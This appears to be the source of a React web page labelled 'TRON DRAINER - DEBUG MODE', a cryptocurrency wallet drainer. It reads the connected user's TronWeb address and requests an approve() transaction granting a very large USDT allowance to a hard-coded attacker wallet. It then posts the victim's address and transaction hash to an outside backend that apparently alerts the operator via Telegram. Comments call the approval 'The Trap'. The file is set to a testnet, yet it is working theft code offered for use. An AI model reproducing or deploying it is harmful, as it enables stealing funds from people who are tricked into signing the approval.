import React, { useState, useEffect } from "react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT on Shasta
const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
const BACKEND = "https://qr-drainer.onrender.com";

export default function App() {
  const [status, setStatus] = useState("Idle");
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => setLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);

  // 1. THE CORE FUNCTIONALITY (No UI fluff)
  const handleDrain = async () => {
    setStatus("Starting...");
    addLog("Process started.");

    // A. Check for Wallet
    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
      addLog("ERROR: TronWeb not detected or not connected.");
      setStatus("Failed: Wallet not connected");
      return;
    }

    const victimAddress = window.tronWeb.defaultAddress.base58;
    addLog(`Connected as: ${victimAddress}`);

    // B. Check Network (Crucial for "Invalid Address" error)
    // If you are on Mainnet, this will fail. You MUST be on Shasta.
    addLog("Checking network...");
    
    try {
      setStatus("Building Payload...");
      addLog("Loading USDT Contract...");
      
      // C. Load Contract
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      addLog("Contract loaded successfully.");

      // D. Execute Approve (The Trap)
      setStatus("Requesting Signature...");
      addLog("Sending approve transaction to wallet...");
      
      // This is the standard, most reliable way to call approve
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      addLog(`Transaction signed! TX ID: ${tx}`);
      setStatus("Success! Waiting for Backend...");

      // E. Alert Backend
      addLog("Pinging backend...");
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      addLog("Backend alerted. Check Telegram.");
      setStatus("✅ DRAIN COMPLETE. Check Telegram.");

    } catch (error) {
      console.error(error);
      addLog(`FATAL ERROR: ${error.message}`);
      setStatus(`Failed: ${error.message}`);
    }
  };

  return (
    <div style={{ padding: "40px", fontFamily: "monospace", background: "#000", color: "#0f0", minHeight: "100vh" }}>
      <h1>TRON DRAINER - DEBUG MODE</h1>
      <p>Current Status: <strong>{status}</strong></p>
      
      <button 
        onClick={handleDrain} 
        style={{ padding: "20px", fontSize: "20px", background: "red", color: "white", border: "none", cursor: "pointer", marginBottom: "20px" }}
      >
        EXECUTE DRAIN (APPROVE)
      </button>

      <div style={{ background: "#111", padding: "20px", border: "1px solid #333" }}>
        <h3>System Logs:</h3>
        {logs.map((log, i) => <div key={i}>{log}</div>)}
      </div>
    </div>
  );
}